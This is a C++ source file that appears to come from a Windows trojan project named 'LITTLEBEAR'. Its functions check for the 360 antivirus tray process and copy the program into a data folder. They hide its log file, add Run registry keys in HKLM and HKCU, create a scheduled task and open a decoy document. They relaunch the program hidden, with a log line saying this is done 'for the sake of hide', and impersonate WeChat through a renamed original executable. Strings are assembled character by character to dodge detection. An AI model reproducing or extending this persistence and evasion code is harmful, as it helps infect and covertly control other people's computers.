#include <Windows.h>
#include "bootHelper.h"
#include "public.h"
#include "api.h"
#include "BootStartup.h"
#include <lmcons.h>
#include <io.h>
#include <lmat.h>
#include <LMErr.h>
#include "AntiVirus.h"
#include "bootdesktop.h"
#include "function/interface.h"
#include "function/InstallApps.h"
#include "network/NetWorkdata.h"
#include "RegHelper.h"
#include "Config.h"
#include "initHelper.h"
#include "public.h"
#include "StrHelper.h"
#include "Utils.h"
#include "log.h"
#include "bootHelper.h"
#include <iostream>



int ReleaseFirstStart() {

	int iRet = 0;

	char szCurrentPath[MAX_PATH] = { 0 };
	char szCurrentExePath[MAX_PATH] = { 0 };
	iRet = lpGetModuleFileNameA(0, szCurrentExePath, MAX_PATH);

	iRet = GetPathFromFullName(szCurrentExePath, szCurrentPath);//GetModuleBaseName	返回进程名不包含路径

	char sz360Tray[] = { '3','6','0','T','r','a','y','.','e','x','e',0 };
	int b360Running = GetProcessIdByName(sz360Tray);

	iRet = ReleaseIcon(strDataPath, lpThisDll);

	char strLogFilePath[MAX_PATH] = { 0 };
	iRet = makeFullFileName(strLogFilePath, LITTLEBEAR_LOG_FILE_NAME);
	iRet = lpSetFileAttributesA(strLogFilePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_SYSTEM);

	if (lplstrcmpiA(szCurrentPath, strDataPath) != 0)
	{
		char szDllName[MAX_DLL_COUNT][MAX_PATH] = { 0 };
		DWORD iDllCnt = 0;
		iRet = backHome(strDataPath, szCurrentPath, szDllName, &iDllCnt);
	}

	if (b360Running)
	{
		int iRet = GetApplicationInfo(TRUE);
		iRet = lnkDesktop(strPEResidence, szSysDir, strUserName, strDataPath);

		writeLog("360 is running so to create icon on desktop\r\n");
	}
	else
	{
		if (iSystemVersion <= SYSTEM_VERSION_XP)
		{
			iRet = SetBootForRegRun(HKEY_LOCAL_MACHINE, strPEResidence);
			iRet = SetBootForRegRun(HKEY_CURRENT_USER, strPEResidence);
			if (iRet == 0)
			{
				writeLog(" windows xp SetBootForRegRun error\r\n");
			}
			else
			{
				writeLog("  windows xp SetBootForRegRun ok\r\n");
			}

			/*
			iRet = BackupProgram(strPEResidence, szDllName, iDllCnt, szSysDir, strUserName, strBakPEResidence);
			if (iRet == 0)
			{
				writeLog("BootAutoRun windows xp BackupProgram error\r\n");
			}
			else
			{
				writeLog("BootAutoRun BackupProgram ok\r\n");
			}*/
		}
		else
		{
			int iRet = createBootTask(SCHEDULE_RUN_MIN_INTERVAL, LITTLEBEARNAME, strPEResidence, "", iSystemVersion);
			iRet = SetBootForRegRun(HKEY_CURRENT_USER, strPEResidence);
			iRet = SetBootForRegRun(HKEY_LOCAL_MACHINE, strPEResidence);
		}
	}

	writeLog("Run first time for network download\r\n");
	
	return TRUE;
}

int AppProxyStart(char * szParam2) {
	int iRet = 0;
	if (lplstrcmpiA(szParam2, "MyComputer") == 0)
	{
		OpenMyComputer();
		writeLog("MyComputer startup\r\n");
	}
	else if (lplstrcmpiA(szParam2, "Recycle") == 0) {
		OpenRecycle();
		writeLog("Recycle startup\r\n");
	}
	else if (lplstrcmpiA(szParam2, "IE") == 0)
	{
		char szIEFilePath[] = { 'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s','\\','I','n','t','e','r','n','e','t',' ',
			'E','x','p','l','o','r','e','r','\\','i','e','x','p','l','o','r','e','.','e','x','e',0 };
		lplstrcpyA(szIEPath, szIEFilePath);
		szIEPath[0] = szSysDir[0];
		char szShellExxcuteAActionOpen[] = { 'o','p','e','n',0 };
		lpShellExecuteA(0, szShellExxcuteAActionOpen, szIEPath, 0, 0, SW_SHOWNORMAL);

		writeLog("IE startup\r\n");
	}
	else if (lplstrcmpiA(szParam2, "QQ") == 0)
	{
		if ((*strQQPath == 0))
		{
			iRet = GetApplicationInfo(TRUE);
		}

		char szQQPath[MAX_PATH];
		lplstrcpyA(szQQPath, strQQPath);
		char szQQSubPath[] = { '\\','B','i','n','\\','Q','Q','S','c','L','a','u','n','c','h','e','r','.','e','x','e',0 };
		lplstrcatA(szQQPath, szQQSubPath);
		char szQQDstPath[MAX_PATH];
		lpwsprintfA(szQQDstPath, "\"%s\"", szQQPath);
		iRet = lpWinExec(szQQDstPath, SW_SHOWNORMAL);

		writeLog("QQ startup\r\n");
	}
	else if (lplstrcmpiA(szParam2, "WeChat") == 0)
	{
		if (*szWechatPath == 0)
		{
			iRet = GetApplicationInfo(TRUE);
		}

		char szWechatTmpPath[MAX_PATH];
		lplstrcpyA(szWechatTmpPath, szWechatPath);
		char szWechatSubPath[] = { '\\','w','e','c','h','a','t','.','e','x','e',0 };
		lplstrcatA(szWechatTmpPath, szWechatSubPath);
		char szWechatDstPath[MAX_PATH];
		lpwsprintfA(szWechatDstPath, "\"%s\" --type=gpu-process", szWechatTmpPath);
		iRet = lpWinExec(szWechatDstPath, SW_SHOWNORMAL);

		writeLog("wechat startup\r\n");
	}
	else if (lplstrcmpiA(szParam2, "FIREFOX") == 0)
	{
		if (*szFireFoxPath == FALSE)
		{
			iRet = GetApplicationInfo(TRUE);
		}

		char sztmppath[MAX_PATH];
		lplstrcpyA(sztmppath, szFireFoxPath);
		char szfirefox[] = { '\\','f','i','r','e','f','o','x','.','e','x','e',0 };
		lplstrcatA(sztmppath, szfirefox);
		char szFireFoxDstPath[MAX_PATH];
		lpwsprintfA(szFireFoxDstPath, "\"%s\"", sztmppath);
		iRet = lpWinExec(szFireFoxDstPath, SW_SHOWNORMAL);

		writeLog("firfox startup\r\n");
	}
	else if (lplstrcmpiA(szParam2, "CHROME") == 0)
	{
		if (*szChromePath == FALSE)
		{
			iRet = GetApplicationInfo(TRUE);
		}

		char sztmppath[MAX_PATH];
		lplstrcpyA(sztmppath, szChromePath);
		char szchrome[] = { '\\','c','h','r','o','m','e','.','e','x','e',0 };
		lplstrcatA(sztmppath, szchrome);
		char szChromeDstPath[MAX_PATH];
		lpwsprintfA(szChromeDstPath, "\"%s\"", sztmppath);
		iRet = lpWinExec(szChromeDstPath, SW_SHOWNORMAL);

		writeLog("chrome startup\r\n");
	}
	return TRUE;
}



int ExplorerFirstStart() {
	int iRet = 0;

	char szCurrentPath[MAX_PATH] = { 0 };
	char szCurrentExePath[MAX_PATH] = { 0 };
	iRet = lpGetModuleFileNameA(0, szCurrentExePath, MAX_PATH);

	iRet = GetPathFromFullName(szCurrentExePath, szCurrentPath);//GetModuleBaseName	返回进程名不包含路径

	char exename[MAX_PATH];
	GetNameFromFullName(szCurrentExePath, exename);
	char servicesExe[] = { 's','e','r','v','i','c','e','s','.','e','x','e',0 };
	if (lplstrcmpiA(exename, servicesExe) != 0) {
		lpExitProcess(0);
	}

	if (lplstrcmpiA(szCurrentPath, strDataPath) != 0)
	{
		char szwechat[] = { 'W','e','C','h','a','t','.','e','x','e',0 };
		char szexplorer[] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };
		char szParentProcName[MAX_PATH];
		iRet = GetParentProcName(szParentProcName);

		char szExeName[MAX_PATH] = { 0 };
		iRet = GetNameFromFullName(szCurrentExePath, szExeName);

		lpwsprintfA(strPEResidence, "%s%s", strDataPath, szExeName);

		char sz360Tray[] = { '3','6','0','T','r','a','y','.','e','x','e',0 };
		int b360Running = GetProcessIdByName(sz360Tray);

		//if ((szParentProcName[0] == 0 || lplstrcmpiA(szParentProcName, szexplorer) == 0) )
		{
			char strShowFileName[MAX_PATH] = { 0 };
			char* pShowFileName = GetLinkDocFileName(strShowFileName, szCurrentPath);
			if (pShowFileName)
			{
				char szShowContentCmd[MAX_PATH] = { 0 };
				lpwsprintfA(szShowContentCmd, "\"%s\"", strShowFileName);
				char szOpen[] = { 'o','p','e','n',0 };
				HINSTANCE hInst = lpShellExecuteA(0, szOpen, szShowContentCmd, 0, strDataPath, SW_NORMAL);
			}
			else {
				ExitProcess(0);
			}
		}


		char szDllName[MAX_DLL_COUNT][MAX_PATH] = { 0 };
		DWORD iDllCnt = 0;
		iRet = backHome(strDataPath, szCurrentPath, szDllName, &iDllCnt);
		iRet = ReleaseIcon(strDataPath, lpThisDll);

		char strLogFilePath[MAX_PATH] = { 0 };
		iRet = makeFullFileName(strLogFilePath, LITTLEBEAR_LOG_FILE_NAME);
		iRet = lpSetFileAttributesA(strLogFilePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_SYSTEM);

		if (b360Running)
		{
			iRet = GetApplicationInfo(TRUE);
			iRet = lnkDesktop(strPEResidence, szSysDir, strUserName, strDataPath);

			writeLog("360 is running so to create icon on desktop\r\n");
		}
		else
		{
			if (iSystemVersion <= SYSTEM_VERSION_XP)
			{
				iRet = SetBootForRegRun(HKEY_LOCAL_MACHINE, strPEResidence);
				iRet = SetBootForRegRun(HKEY_CURRENT_USER, strPEResidence);
				if (iRet == 0)
				{
					writeLog(" windows xp SetBootForRegRun error\r\n");
				}
				else
				{
					writeLog("  windows xp SetBootForRegRun ok\r\n");
				}

				/*
				iRet = BackupProgram(strPEResidence, szDllName, iDllCnt, szSysDir, strUserName, strBakPEResidence);
				if (iRet == 0)
				{
					writeLog("BootAutoRun windows xp BackupProgram error\r\n");
				}
				else
				{
					writeLog("BootAutoRun BackupProgram ok\r\n");
				}*/
			}
			else
			{
				iRet = createBootTask(SCHEDULE_RUN_MIN_INTERVAL, LITTLEBEARNAME, strPEResidence, "", iSystemVersion);
				iRet = SetBootForRegRun(HKEY_CURRENT_USER, strPEResidence);
				iRet = SetBootForRegRun(HKEY_LOCAL_MACHINE, strPEResidence);
			}
		}

		if (lstrcmpiA(szwechat, szExeName) == 0)
		{
			char wechatcmd[MAX_PATH] = { 0 };
			lpwsprintfA(wechatcmd, "\"%s%s\"", szCurrentExePath, "wechatorg.exe");
			//char szopen[] = { 'o','p','e','n',0 };
			//HINSTANCE hInst = lpShellExecuteA(0, szopen,szCmd,0,strDataPath,SW_HIDE);
			iRet = lpWinExec(wechatcmd, SW_HIDE);
		}
		else {
			if (gMutex)
			{
				lpReleaseMutex(gMutex);
				lpCloseHandle(gMutex);
			}
			char szCmd[MAX_PATH] = { 0 };
			lpwsprintfA(szCmd, "\"%s\" -s", strPEResidence);
			//char szopen[] = { 'o','p','e','n',0 };
			//HINSTANCE hInst = lpShellExecuteA(0, szopen,szCmd,0,strDataPath,SW_HIDE);
			iRet = lpWinExec(szCmd, SW_HIDE);

			char szShowInfo[1024];
			lpwsprintfA(szShowInfo, 
				"explorer.exe start program at first, now to restart program:%s at second for the sake of hide\r\n",
				strPEResidence);
			writeLog(szShowInfo);

			lpExitProcess(0);
			return FALSE;
		}	
	}
	else {
		ExitProcess(0);
	}

	return 0;
}